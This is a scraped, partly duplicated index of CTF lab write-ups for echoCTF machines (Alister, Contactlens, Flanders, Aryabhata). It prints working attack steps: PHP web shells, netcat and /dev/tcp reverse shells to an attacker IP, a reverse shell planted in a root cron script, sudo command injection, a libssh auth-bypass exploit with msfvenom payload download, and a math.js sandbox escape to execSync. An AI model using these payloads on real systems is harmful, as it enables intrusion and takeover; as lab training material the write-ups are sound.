Content-Type: text/html | Date: Mon, 23 Jun 2025 19:54:27 GMT | \u0026lt;!DOCTYPE html\u0026gt; | \u0026lt;html lang=\u0026#34;en\u0026#34; translate=\u0026#34;no\u0026#34;\u0026gt; | \u0026lt;head\u0026gt; | \u0026lt;script src=\u0026#34;https://polyfill.io/v3/polyfill.min.js?features=String.prototype.replaceAll\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; | \u0026lt;meta charset=\u0026#34;utf-8\u0026#34; \u0026gt; | \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1\u0026#34; \u0026gt; | \u0026lt;meta name=\u0026#34;referrer\u0026#34; content=\u0026#34;same-origin\u0026#34; \u0026gt; | \u0026lt;meta name=\u0026#34;generator\u0026#34; content=\u0026#34;AList V3\u0026#34; \u0026gt; | \u0026lt;meta name=\u0026#34;theme-color\u0026#34; content=\u0026#34;#000000\u0026#34; \u0026gt; | \u0026lt;meta name=\u0026#34;google\u0026#34; content=\u0026#34;notranslate\u0026#34; \u0026gt; | \u0026lt;script src=\u0026#34;https://g.alicdn.com/IMM/office-js/1.1.5/aliyun-web-office-sdk.min.js\u0026#34; | async | \u0026gt;\u0026lt;/script\u0026gt; | \u0026lt;link rel=\u0026#34;shortcut icon\u0026#34; | type=\u0026#34;image/ico\u0026#34; | href=\u0026#34;https://cdn.jsdelivr.net/gh/alist-org/logo@main/logo.svg\u0026#34; | \u0026lt;title\u0026gt;AList\u0026lt;/title\u0026gt; | \u0026lt;script\u0026gt; | window.ALIST = { | cdn: \u0026#39;\u0026#39;, |_ monaco_cdn: undefin Analyzing the NMAP scan we can see there are 2 ports open 1337 and 5244. Port 1337 is an NGINX webserver and we also get the version 1.18.0 Port 5244, is unknown at the moment but we can see a lot of output.\nStarting by visiting the web server on port 1337 we get the first flag but nothing interesting sticks out that will be a valid attack vector.\nAs always we can first view the source code for any hint and start fuzzing the webserver for hidden directories.\nDirectory brute forcing with Gobuster gobuster dir -u http://10.0.50.0:1337/ -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -o rsw.txt Output /temp (Status: 301) [Size: 169] [--\u0026gt; http://10.0.50.0:1337/temp/] /public (Status: 301) [Size: 169] [--\u0026gt; http://10.0.50.0:1337/public/] /. (Status: 200) [Size: 72] When we try to access both directories we get 403 Forbidden.\nLets check the other port (5244) found till our gobuster finishes.\nUpon visiting, we get an AList instance which is a WebDav service according to github..\nBy clicking around in order to understand how ALister works, it seems that we can access the public folder and which allows us to upload files. This can be done by clicking on the 3 dots on the bottom right. Additionally, it is also notice that the public folder includes a flag and directory structure is the same as when we visited port 1337.\nTo confirm this theory we can upload a test.txt file with the WebDav service and then try to access it from the NGINX webserver running on port 1337\necho \u0026#34;dotpirate\u0026#34; \u0026gt; test.txt Explotation it seems that our theory is indeed correct. Now we can try to upload a PHP web shell and hope that the NGINX server has the ability to execute PHP code. If that is the case then we will have execution on the server\ncat webshell.php \u0026lt;?php system($_REQUEST[\u0026#39;cmd\u0026#39;]); ?\u0026gt; We have command execution on the webserver!\nLets get a reverse shell! To do so lets check if nc is installed on the server by using the following command:\n‚îî‚îÄ$ curl \u0026#39;http://10.0.50.0:1337/public/webshell.php?cmd=which%20nc\u0026#39; # Output /bin/nc nc is indeed installed on the server as the path of the executable returned back. Let get a reverse shell using it.\nsudo nc -nvlp 80 curl \u0026#39;http://10.0.50.0:1337/public/webshell.php?cmd=/bin/nc%2010.10.11.150%2080%20-e%20/bin/sh\u0026#39; We got a shell as www-data!\nPrivilege Escalation Lets upgrade our shell using python\npython3 -c \u0026#39;import pty;pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; CTRL + Z stty raw -echo;fg (Press Enter) (Press Enter) (Press Enter) export TERM=xterm Before running linpeas.sh to automate most of the PE enumeration I like to look for easy wins with some simple manual enumeration. I always look for sudo commands with suodo -l, then check fot any dangerous user groups with id, then i will check the /opt and /tmp directories for any an usual files or folders.\nin this case inside /tmp is an sqlite3 database which contains a password!\nI tried this password on root but i could not login as root, i also tried this password on www-data by running sudo -l but it did not work either. Then i tried logging in as admin on the ALister WebDav service and it worked!\nUpon logging in as admin it is noticed that we have new functionality that we can abuse!\nIt seems that we can mount the root directory of the whole system! Now when we go back to \u0026ldquo;Home\u0026rdquo; we can see that we have full access to the the whole system, thus we can modify any file of our choice.\nI know there easier way to get root with this kind of access however I wanted to showcase we could do that with a cronjob that was identified running as root..\nI was able to find this by running pspy64. We must first upload this to the target machine change its permissions with chmod and then run it as shown below.\nkali@kali:/$ python3 -m http.server 80 www-data@alister:/tmp$ wget http://10.10.11.150/pspy64 -O /tmp/pspy www-data@alister:/tmp$ chmod +x pspy www-data@alister:/tmp$ ./pspy -c -i 1000 Output Looking at the results of the tool we can see that the bash script called healthcheck.sh is running very often and according to the UID which is 0 , is running as root. Thus we can go ahead and add a reverse shell within that script in order to get shell back as root\ncat healthcheck.sh #!/bin/bash /bin/bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.11.150/80 0\u0026gt;\u0026amp;1 sudo nc -nvlp 80 ROOT!\n","date":"2025-06-25T00:00:00Z","permalink":"https://hack.com.cy/writeups/echoctf/alister/alister/","section":"writeups","tags":["file upload","PHP webshell","Exposed Credentials","privilege escalation"],"title":"echoCTF Alister Writeup: File Upload to Root via Exposed Credentials"},{"categories":["CTF","OSCP Prep","echoCTF"],"contents":"Video Walkthrough Alister Enumeration NMAP Port Scan sudo nmap -nvv -p- 10.0.50.0 -T4 -sC -sV Output PORT STATE SERVICE REASON VERSION 1337/tcp open http syn-ack ttl 63 nginx 1.18.0 | http-methods: |_ Supported Methods: GET HEAD POST |_http-title: Site doesnt have a title (text/html; charset=UTF-8). |_http-server-header: nginx/1.18.0 5244/tcp open unknown syn-ack ttl 63 | fingerprint-strings: | GenericLines: | HTTP/1.1 400 Bad Request | Content-Type: text/plain; charset=utf-8 | Connection: close | Request | GetRequest: | HTTP/1.0 200 OK | Content-Type: text/html | Date: Mon, 23 Jun 2025 19:54:26 GMT | \u0026lt;!DOCTYPE html\u0026gt; | \u0026lt;html lang=\u0026#34;en\u0026#34; translate=\u0026#34;no\u0026#34;\u0026gt; | \u0026lt;head\u0026gt; | \u0026lt;script src=\u0026#34;https://polyfill.io/v3/polyfill.min.js?features=String.prototype.replaceAll\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; | \u0026lt;meta charset=\u0026#34;utf-8\u0026#34; \u0026gt; | \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1\u0026#34; \u0026gt; | \u0026lt;meta name=\u0026#34;referrer\u0026#34; content=\u0026#34;same-origin\u0026#34; \u0026gt; | \u0026lt;meta name=\u0026#34;generator\u0026#34; content=\u0026#34;AList V3\u0026#34; \u0026gt; | \u0026lt;meta name=\u0026#34;theme-color\u0026#34; content=\u0026#34;#000000\u0026#34; \u0026gt; | \u0026lt;meta name=\u0026#34;google\u0026#34; content=\u0026#34;notranslate\u0026#34; \u0026gt; | \u0026lt;script src=\u0026#34;https://g.alicdn.com/IMM/office-js/1.1.5/aliyun-web-office-sdk.min.js\u0026#34; | async | \u0026gt;\u0026lt;/script\u0026gt; | \u0026lt;link rel=\u0026#34;shortcut icon\u0026#34; | type=\u0026#34;image/ico\u0026#34; | href=\u0026#34;https://cdn.jsdelivr.net/gh/alist-org/logo@main/logo.svg\u0026#34; | \u0026lt;title\u0026gt;AList\u0026lt;/title\u0026gt; | \u0026lt;script\u0026gt; | window.ALIST = { | cdn: \u0026#39;\u0026#39;, | monaco_cdn: undefin | HTTPOptions: | HTTP/1.0 200 OK | Content-Type: text/html | Date: Mon, 23 Jun 2025 19:54:27 GMT | \u0026lt;!DOCTYPE html\u0026gt; | \u0026lt;html lang=\u0026#34;en\u0026#34; translate=\u0026#34;no\u0026#34;\u0026gt; | \u0026lt;head\u0026gt; | \u0026lt;script src=\u0026#34;https://polyfill.io/v3/polyfill.min.js?features=String.prototype.replaceAll\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; | \u0026lt;meta charset=\u0026#34;utf-8\u0026#34; \u0026gt; | \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1\u0026#34; \u0026gt; | \u0026lt;meta name=\u0026#34;referrer\u0026#34; content=\u0026#34;same-origin\u0026#34; \u0026gt; | \u0026lt;meta name=\u0026#34;generator\u0026#34; content=\u0026#34;AList V3\u0026#34; \u0026gt; | \u0026lt;meta name=\u0026#34;theme-color\u0026#34; content=\u0026#34;#000000\u0026#34; \u0026gt; | \u0026lt;meta name=\u0026#34;google\u0026#34; content=\u0026#34;notranslate\u0026#34; \u0026gt; | \u0026lt;script src=\u0026#34;https://g.alicdn.com/IMM/office-js/1.1.5/aliyun-web-office-sdk.min.js\u0026#34; | async | \u0026gt;\u0026lt;/script\u0026gt; | \u0026lt;link rel=\u0026#34;shortcut icon\u0026#34; | type=\u0026#34;image/ico\u0026#34; | href=\u0026#34;https://cdn.jsdelivr.net/gh/alist-org/logo@main/logo.svg\u0026#34; | \u0026lt;title\u0026gt;AList\u0026lt;/title\u0026gt; | \u0026lt;script\u0026gt; | window.ALIST = { | cdn: \u0026#39;\u0026#39;, |_ monaco_cdn: undefin Analyzing the NMAP scan we can see there are 2 ports open 1337 and 5244. Port 1337 is an NGINX webserver and we also get the version 1.18.0 Port 5244, is unknown at the moment but we can see a lot of output.\nStarting by visiting the web server on port 1337 we get the first flag but nothing interesting sticks out that will be a valid attack vector.\nAs always we can first view the source code for any hint and start fuzzing the webserver for hidden directories.\nDirectory brute forcing with Gobuster gobuster dir -u http://10.0.50.0:1337/ -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -o rsw.txt Output /temp (Status: 301) [Size: 169] [--\u0026gt; http://10.0.50.0:1337/temp/] /public (Status: 301) [Size: 169] [--\u0026gt; http://10.0.50.0:1337/public/] /. (Status: 200) [Size: 72] When we try to access both directories we get 403 Forbidden.\nLets check the other port (5244) found till our gobuster finishes.\nUpon visiting, we get an AList instance which is a WebDav service according to github..\nBy clicking around in order to understand how ALister works, it seems that we can access the public folder and which allows us to upload files. This can be done by clicking on the 3 dots on the bottom right. Additionally, it is also notice that the public folder includes a flag and directory structure is the same as when we visited port 1337.\nTo confirm this theory we can upload a test.txt file with the WebDav service and then try to access it from the NGINX webserver running on port 1337\necho \u0026#34;dotpirate\u0026#34; \u0026gt; test.txt Explotation it seems that our theory is indeed correct. Now we can try to upload a PHP web shell and hope that the NGINX server has the ability to execute PHP code. If that is the case then we will have execution on the server\ncat webshell.php \u0026lt;?php system($_REQUEST[\u0026#39;cmd\u0026#39;]); ?\u0026gt; We have command execution on the webserver!\nLets get a reverse shell! To do so lets check if nc is installed on the server by using the following command:\n‚îî‚îÄ$ curl \u0026#39;http://10.0.50.0:1337/public/webshell.php?cmd=which%20nc\u0026#39; # Output /bin/nc nc is indeed installed on the server as the path of the executable returned back. Let get a reverse shell using it.\nsudo nc -nvlp 80 curl \u0026#39;http://10.0.50.0:1337/public/webshell.php?cmd=/bin/nc%2010.10.11.150%2080%20-e%20/bin/sh\u0026#39; We got a shell as www-data!\nPrivilege Escalation Lets upgrade our shell using python\npython3 -c \u0026#39;import pty;pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; CTRL + Z stty raw -echo;fg (Press Enter) (Press Enter) (Press Enter) export TERM=xterm Before running linpeas.sh to automate most of the PE enumeration I like to look for easy wins with some simple manual enumeration. I always look for sudo commands with suodo -l, then check fot any dangerous user groups with id, then i will check the /opt and /tmp directories for any an usual files or folders.\nin this case inside /tmp is an sqlite3 database which contains a password!\nI tried this password on root but i could not login as root, i also tried this password on www-data by running sudo -l but it did not work either. Then i tried logging in as admin on the ALister WebDav service and it worked!\nUpon logging in as admin it is noticed that we have new functionality that we can abuse!\nIt seems that we can mount the root directory of the whole system! Now when we go back to \u0026ldquo;Home\u0026rdquo; we can see that we have full access to the the whole system, thus we can modify any file of our choice.\nI know there easier way to get root with this kind of access however I wanted to showcase we could do that with a cronjob that was identified running as root..\nI was able to find this by running pspy64. We must first upload this to the target machine change its permissions with chmod and then run it as shown below.\nkali@kali:/$ python3 -m http.server 80 www-data@alister:/tmp$ wget http://10.10.11.150/pspy64 -O /tmp/pspy www-data@alister:/tmp$ chmod +x pspy www-data@alister:/tmp$ ./pspy -c -i 1000 Output Looking at the results of the tool we can see that the bash script called healthcheck.sh is running very often and according to the UID which is 0 , is running as root. Thus we can go ahead and add a reverse shell within that script in order to get shell back as root\ncat healthcheck.sh #!/bin/bash /bin/bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.11.150/80 0\u0026gt;\u0026amp;1 sudo nc -nvlp 80 ROOT!\n","date":"2025-06-25T00:00:00Z","permalink":"https://hack.com.cy/writeups/htb/delivery/delivery/","section":"writeups","tags":["file upload","PHP webshell","Exposed Credentials","privilege escalation"],"title":"echoCTF Alister Writeup: File Upload to Root via Exposed Credentials"},{"categories":["CTF","OSCP Prep","echoCTF"],"contents":"Video Walkthrough Enumeration Start by port scanning the target machine\nNMAP nmap -vv -Pn -p- -T4 10.0.50.0 -sC -sV NMAP Output PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 63 OpenSSH 8.4p1 Debian 5+deb11u2 (protocol 2.0) | ssh-hostkey: | 3072 8c:e1:6f:39:a7:65:ac:64:06:c6:43:72:40:ca:3f:64 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCeHruyMrJp6Aoww8WvypDa5GOOAa5d1wSC5fpaJ9CS8izg9dtWJOarrrZGAPgvA4RMa3a3qdapuUt342oLKfadUQKwZA9wHupAivBCLN1HmjN2RCOAmXHxTWse3cz0cv9ZEAHxtvNBO0nWmf63DrEAeDJXpkgV/dOgYHtll2yoDs0apKrdP7b3Br3YaGwUF/bVN6+WhTp9d2AXuHfDy28pe+a2t2YjuAwy34NlS7qjDyY1mqrBTyb7B7ZEwrPJjmli3iZA/9Ge//8O9mxCdW70IdMLbGrZ+fL0FHTvdP8Y/tOUndoCnY3BX3N4Jk44c5yxm0yPVMfYgBlST/tua0czRP3/qnM+KmoyDPGDwSFP1yaLSWL4OvVILOwqCzh7UsX/Z2lODK4QlxmP6jU2i2H3nOBA+T/I4BktAaIA7NB8Vn8DKEgu2iAT6JUVVapoFMvUUNgkqJYywMrx/39ZCyIOmg4XAniqmRgIIU02S5HylqWQQcaDylbqtrt1GmPLpUM= | 256 2b:30:87:a5:9f:44:b8:3b:65:7e:94:75:e6:61:8f:97 (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAwOrlGNc9A2kRYgbsM/dEziRmuM5PlVnN6Fig5UbRsJPGePGPD/pfkwTALxvOULoYWhRZesLQEBFFwM+XFHQHA= | 256 15:e2:f7:e4:fa:0a:29:e3:7e:ce:36:ae:9f:3e:75:ac (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINbIqZ2bHXwtkxS6Xm5dSUDBOJFo39M5VqA1lfSLnAC0 1337/tcp open http syn-ack ttl 63 nginx 1.18.0 |_http-server-header: nginx/1.18.0 |_http-title: Contact Manager Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel The nmap scan shows 2 ports open. Port 22 is SSH Port 1337, runs an nginx 1.18.0 web server.\nVisit the webserver: Viewing the webserver we can find out that it uses PHP.\nExploitation Lets start a directory brute force before while we examine the functionality of the web application.\ngobuster dir -u http://10.0.50.0:1337/ -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -x .php -o rsw.txt Trying to run the command gives as an error regarding Length:. We can fix this with the --exclude-length flag\ngobuster dir -u http://10.0.50.0:1337/ -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -x .php --exclude-length \u0026#34;10048\u0026#34; -o rsw.txt /images (Status: 301) [Size: 169] [--\u0026gt; http://10.0.50.0:1337/images/] /conn (Status: 301) [Size: 169] [--\u0026gt; http://10.0.50.0:1337/conn/] Trying to visit both directories gives as a 403 FORBIDDEN.\nLets examine the functionality of the application..\nIt seems we can add a \u0026ldquo;contact\u0026rdquo; along with an image\nSince we know that the webserver can execute PHP code we could try and upload a php file.\nit seems that we cannot.\nNotice that the web application allows the user to also edit the contact. We can try changing our contact\u0026rsquo;s image with a php file.\ncat test.php \u0026lt;?php system($_REQUEST[\u0026#39;cmd\u0026#39;]); ?\u0026gt; Success!\nNow since the file was supposed to be an image and according to our directory brute force attack we found a directory called images we can try to access our malicious PHP script under /images/test.php\nWe have execution on the server!\nLets get a reverse shell by first checking if nc is installed on the target server utilising the which command likewise\nnc exist on the box so lets see if we can get a reverse shell.\nsudo nc -nvlp 1337 curl \u0026#39;http://10.0.50.0:1337/images/test.php?cmd=/bin/nc+10.10.11.150+1337+-e+/bin/bash\u0026#39; Noticed that port 1337 was used to receive the shell. This is because we already know that the target server allows connection on that port as the webserver itself is running on that port!\nPrivilege Escalation Lets upgrade our shell using python\npython3 -c \u0026#39;import pty;pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; CTRL + Z stty raw -echo;fg (Press Enter) (Press Enter) (Press Enter) export TERM=xterm Manual enumeration i always do before going for automated scripts\n# Check who we are? id # What other users exist on the box? cat /etc/passwd | grep sh$ # Do i have sudo capabilities? sudo -l # Are there ant localservices running on the box? netstat -ano | grep LIST ss -antp # Always check the directroy we landed it, in this case is `/var/www/html/images` ls -la # Check for wierd files in `/opt` and `/tmp` ls -la /tmp \u0026amp;\u0026amp; ls -la /opt Analyzing the ouput\nwww-data@contactlens:~/html/images$ id uid=33(www-data) gid=33(www-data) groups=33(www-data) www-data@contactlens:~/html/images$ cat /etc/passwd | grep sh$ root:x:0:0:root:/root:/bin/bash ETSCTF:x:1000:65534:ETSCTF_65d03c84f1f6dc71ee01db6f9384f2d2:/home/ETSCTF:/bin/bash www-data@contactlens:~/html/images$ sudo -l Matching Defaults entries for www-data on contactlens: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin User www-data may run the following commands on contactlens: (ALL : ALL) NOPASSWD: /usr/local/bin/contactlens We can see that our user has the ability to run a command called contactlens as SUDO.\nLets examine what the command does and if we can exploit it!\nAt first glance we can see that the application requires 3 parameters\nsudo /usr/local/bin/contactlens You need three parameters URL,OpenSSL \u0026amp; includeSpdy Be reading what the command does it is notice that the tool utilizes a node library called is-http2\ncat /usr/local/bin/contactlens #!/usr/bin/node var ish2 = require(\u0026#34;is-http2\u0026#34;); var args = process.argv.slice(2); if(args.length\u0026lt;3) { console.error(\u0026#34;You need three parameters URL,OpenSSL \u0026amp; includeSpdy\u0026#34;); } else { console.log(ish2(args[0],{openssl:args[1],includeSpdy: args[2]})); } Also when we try to see what else is inside /usr/local/bin we can see that the contactlens command is a link and if we examine the parent directories of its path we find the version of the is-http2 node library 1.2.0\nwww-data@contactlens:/usr/local/bin$ ls -la total 8 drwxr-xr-x 1 root root 4096 Oct 24 2023 . drwxr-xr-x 1 root root 4096 Apr 11 2023 .. lrwxrwxrwx 1 root root 37 Oct 24 2023 contactlens -\u0026gt; ../lib/node_modules/ish2/bin/index.js www-data@contactlens:/usr/local/bin$ cd ../lib/node_modules/ish2/bin/ www-data@contactlens:/usr/local/lib/node_modules/ish2/bin$ ls -la total 12 drwxrwxr-x 2 root root 4096 Sep 13 2023 . drwxr-xr-x 4 root root 4096 Oct 24 2023 .. -rwxr-xr-x 1 root root 254 Sep 13 2023 index.js www-data@contactlens:/usr/local/lib/node_modules/ish2/bin$ cd .. www-data@contactlens:/usr/local/lib/node_modules/ish2$ ls -la total 76 drwxr-xr-x 4 root root 4096 Oct 24 2023 . drwxr-xr-x 1 root root 4096 Oct 24 2023 .. drwxrwxr-x 2 root root 4096 Sep 13 2023 bin drwxr-xr-x 77 root root 4096 Oct 24 2023 node_modules -rw-r--r-- 1 root root 53885 Oct 24 2023 package-lock.json -rw-rw-r-- 1 root root 322 Oct 24 2023 package.json www-data@contactlens:/usr/local/lib/node_modules/ish2$ cat package.json { \u0026#34;name\u0026#34;: \u0026#34;ish2\u0026#34;, \u0026#34;version\u0026#34;: \u0026#34;1.0.0\u0026#34;, \u0026#34;description\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;main\u0026#34;: \u0026#34;bin/index.js\u0026#34;, \u0026#34;bin\u0026#34;: { \u0026#34;contactlens\u0026#34;: \u0026#34;bin/index.js\u0026#34; }, \u0026#34;scripts\u0026#34;: { \u0026#34;test\u0026#34;: \u0026#34;echo \\\u0026#34;Error: no test specified\\\u0026#34; \u0026amp;\u0026amp; exit 1\u0026#34; }, \u0026#34;keywords\u0026#34;: [], \u0026#34;author\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;license\u0026#34;: \u0026#34;ISC\u0026#34;, \u0026#34;dependencies\u0026#34;: { \u0026#34;is-http2\u0026#34;: \u0026#34;^1.2.0\u0026#34; } } When we search for exploit regarding is-http2 1.2.0 we find a command-injection vulnerability!\nIt seems that we can inject system commands on arg[1] when running contactlens\nsudo /usr/local/bin/contactlens \u0026#34;http://127.0.0.1\u0026#34; \u0026#34;touch /tmp/fromroot\u0026#34; \u0026#34;anything\u0026#34; Even though it error out our command still executes!\nNow lets try to get a reverse shell as root. For this we going to utilize nc and port 22 as we already know its open from out nmap scan.\nROOT!\n","date":"2025-06-25T00:00:00Z","permalink":"https://hack.com.cy/writeups/echoctf/contactlens/contactlens/","section":"writeups","tags":["file upload","PHP webshell","Command Injection","privilege escalation"],"title":"echoCTF Contactlens Writeup: File Upload to Root via Command Injection"},{"categories":["CTF","OSCP Prep","echoCTF"],"contents":"Video Walkthrough Flanders Enumeration NMAP Port Scan sudo nmap -vv -p- 10.0.50.0 -T4 -sC -sV -oA nmap/allports Output PORT STATE SERVICE REASON VERSION 6022/tcp open ssh syn-ack ttl 63 libssh 0.8.1 (protocol 2.0) | ssh-hostkey: | 2048 9c:42:2e:fa:60:30:95:dd:a0:60:80:1f:fd:ae:77:86 (RSA) |_ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDF7bYwrFoV/ukt+Dv8+2ZbdxEoyYGkvq8tEO7cbR9jTl96QN//1v8lOw4o0b26uA7wHBWs5+zPZm6SeGIazx+Bj3mih6Oofm/9HU+FLHTCb+uo5kaG6v8g7gwjkoFNyx/rn+G+BKAMY6op4+6P6CqFFv1yfEhVWWqItla0kmfp3jwD1HCd/i0OxFsUN335RYeokeLqrG1kpoyVlsiqHMZWbz7DUDE2BjTVy1WcZAJtukCa7OHJKMZuh/AVCrCUuTrA3TRHJdl4+AR1GpI+UscHwmwZRsRsVAwgjC7v93fdD+zmrTth15XH7vXYkUK/ZAyaK8cAJOg2lCeNCwuw5OWh Analyzing the NMAP output we can see that we found port 6022 open, and it seems that is SSH. We can also view the version of the SSH service (libss 0.8.1).\nTo confirm that this is actually the version of the SSH server we can furter fingerprint the service using nc\nnc -nvC 10.0.50.0 6022 Output (UNKNOWN) [10.0.50.0] 6022 (?) open SSH-2.0-libssh_0.8.1 Now that we have the version of the SSH we can search for known vulnerabilities on the web. What i usually do when i search for vulnerabilities for a specific software or service, is that i append the keywords \u0026ldquo;poc\u0026rdquo; \u0026ldquo;exploit\u0026rdquo; \u0026ldquo;github\u0026rdquo; prepending the version number and service name\nWe can see that there are a lot of exploits available regarding this particular version of and most importantly we get the CVE number to search more specifically.\nThe following exploit worked for me: https://gist.github.com/mgeeky/a7271536b1d815acfb8060fd8b65bd5d?permalink_comment_id=3077048\nExploitation We can download the GitHub repo and install the requirements for the exploit to work. First lets copy the exploit by clicking the raw format and paste it locally on our attacking machine:\ncat sshlibexp.py #!/usr/bin/python3 # # CVE-2018-10993 libSSH authentication bypass exploit... \u0026lt;snip\u0026gt; Reading the script we can see that there is a python module required called paramiko and since is a python script it is a good practice to create a python virtual environment to install what is required.\nsudo apt install python3-venv python3 -m venv .venv source .venv/bin/activate python3 -m pip install paramiko python3 sshlibexp.py 10.0.50.0 -p 6022 -c \u0026#34;cat /etc/passwd\u0026#34; We get an error but the script rans successfully. We now have command execution on the target server.\nLets get a reverse shell..\nLets first check the architecture of the target server so we know what kind of architecture should our shell be.\npython3 sshlibexp.py 10.0.50.0 -p 6022 -c \u0026#34;uname -a\u0026#34; Is a x64 architecture so lets create an x64 reverse shell using msfvenom and then download our rshell to the target machine using wget\nsudo msfvenom -p linux/x64/shell_reverse_tcp LHOST=\u0026lt;attacker-ip\u0026gt; LPORT=80 -f elf -o x64 python3 -m http.server 80 python3 sshlibexp.py 10.0.50.0 -p 6022 -c \u0026#34;wget http://10.10.11.150/x64 -O /tmp/x64\u0026#34; Now that our rshell is downloaded we can go ahead and use chmod to make it executable and then execute the rshell\npython3 sshlibexp.py 10.0.50.0 -p 6022 -c \u0026#34;chmod +x /tmp/x64\u0026#34; sudo nc -nvlp 80 python3 sshlibexp.py 10.0.50.0 -p 6022 -c \u0026#34;/tmp/x64\u0026#34; We got in!\nTo have a better shell we can use python3 likewise:\npython3 -c \u0026#34;import pty;pty.spawn(\u0026#39;/bin/bash\u0026#39;)\u0026#34; Ctr+Z stty raw -echo;fg (Press Enter) (Press Enter) (Press Enter) export TERM=xterm Now we have a fully functional shell!\nPrivilege Escalation Most of the times i check for sudo privileges or SUID binaries however in this case by checking what is running locally on the box we find out that there is an SSH service running locally.\nss -antp Trying to access the local SSH service as root with the password give in the hint but we get access denied ssh root@127.0.01 OkilyDokily Looking further around knowing we are dealing with an SSH service, it is noticed that there is private key under the home directory of ETSCTF user called \u0026ldquo;mykey\u0026rdquo; and its owned by root!\nWe can try using the private key to access the SSH server locally as root!\nETSCTF@flanders:/home/ETSCTF/.ssh$ ssh -i mykey root@127.0.01 ROOT!\n","date":"2025-06-25T00:00:00Z","permalink":"https://hack.com.cy/writeups/echoctf/flanders/flanders/","section":"writeups","tags":["Authentication Bypass","Linux","privilege escalation","Public Exploit"],"title":"echoCTF Flanders Writeup: Vulnerable SSH version to Root"},{"categories":["CTF","OSCP Prep","echoCTF"],"contents":"Start by port scanning the target machine.\nEnumeration NMAP sudo nmap -nvv -p- 10.0.50.0 -T4 -A -oA nmap/writeup NMAP OUTPUT PORT STATE SERVICE REASON VERSION 80/tcp open http syn-ack ttl 63 nginx 1.10.3 |_http-server-header: nginx/1.10.3 |_http-title: Welcome to Aryabhata 9229/tcp open http syn-ack ttl 63 nginx 1.10.3 |_http-server-header: nginx/1.10.3 |_http-title: 502 Bad Gateway NMAP results show us that there are 2 nginx webserver running on ports 80 and 9229 Port 80 return a web application which has calculation functionality while port 9229 gives us back a 502 Bad Gateway\nExploitation The web application has a functionality were we can do various math calculations and the result is being reflected back to us.\nLooking at the source code there is comment that gives us a hint, however i did not find it useful at all. We can also see the logic when the \u0026ldquo;Calculate\u0026rdquo; button is clicked. It seems that our input is sent to an endpoint /got_maths/maths via POST\nLets try to break the application by injecting various weird characters and see if we can figure out what technology is running behind, even though the description tell us that this is nodejs.\nBy utilizing ffuf and a wordlist with special characters we can analyze the request length and see if anything stands out.\nTo do this using ffuf we have to copy the POST request towards /got_maths/maths from burp and save it locally. Then modified the file and add the word FUZZ at the location we want to FUZZ in this case is equation=FUZZ\nWe can now use ffuf and a wordlist with special symbols from seclists\nAdding the -x flag allows us to see our requests through burp in order to make our attack is going as expected.\nffuf -X POST -request req.txt -request-proto \u0026#34;http\u0026#34; -w /usr/share/wordlists/seclists/Fuzzing/special-chars\\ +\\ urlencoded.txt -x http://127.0.0.1:8080 Filtering by length 1 of the special characters sticks out but I was not able anything out of it.\nWe could also try brute-forcing the input with different kind of words just to see how the application responds. We going to use a small wordlist for this.\nffuf -X POST -request req.txt -request-proto \u0026#34;http\u0026#34; -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -x http://127.0.0.1:8080 Again filtering by length we see interesting results.\nIt seems that some of the words we brute-force are something like variables for the web application. By just copy and pasting the output of the word help in google we can identify the technology running on the background.\nSo it seems the web application is utilizing something called Math.js. Following the link it seems we can get all of its documentation.\nUsing the word version we can get its version\nSearching online for exploits, vulnerabilities or PoC about Math.js version 3.10.1 we can see some interesting results.\nReading through various resources I knew that I was close to the solution but i could not figure out what to do next or how to approach it. So i decided to use AI rather than viewing the solution from a writeup.\nIt figured out that we are sandboxed within the Math.js environment and we had to escape.\nProbing the environment with harmless ‚Äúconstructor chain‚Äù touches:\n[] ‚Üí array literal\n[].constructor ‚Üí the Array constructor\n[].constructor.constructor ‚Üí the Function constructor\nThe responses confirm we‚Äôre evaluating inside math.js and can still reach Function via the prototype chain. That‚Äôs the key: if we can call new Function(\u0026quot;‚Ä¶\u0026quot;), we can run arbitrary JS despite the math ‚Äúsandbox‚Äù.\nNow that we accessed Function, we built this payload:\nequation=[].constructor.constructor(\u0026#34;return global.process.mainModule.require(\u0026#39;child_process\u0026#39;).execSync(\u0026#39;id\u0026#39;).toString()\u0026#34;)() And we have command execution as root!\nLets get a reverse shell\n[].constructor.constructor(\u0026#34;return global.process.mainModule.require(\u0026#39;child_process\u0026#39;).execSync(\u0026#39;nc 10.10.11.150 80 -e /bin/bash\u0026#39;).toString()\u0026#34;)() ROOT!\n","date":"2025-06-03T00:00:00Z","permalink":"https://hack.com.cy/writeups/echoctf/aryabhata/aryabhata/","section":"writeups","tags":["SSEI","Node","Express"],"title":"echoCTF Aryabhata Writeup: From Server Site Expression Injection to root"},{"categories":["CTF","OSCP Prep","echoCTF"],"contents":"Video Walkthrough Badwidth Enumeration NMAP Port Scan sudo nmap -nvv -p- 10.0.50.0 -T4 -sC -sV Output PORT STATE SERVICE REASON VERSION 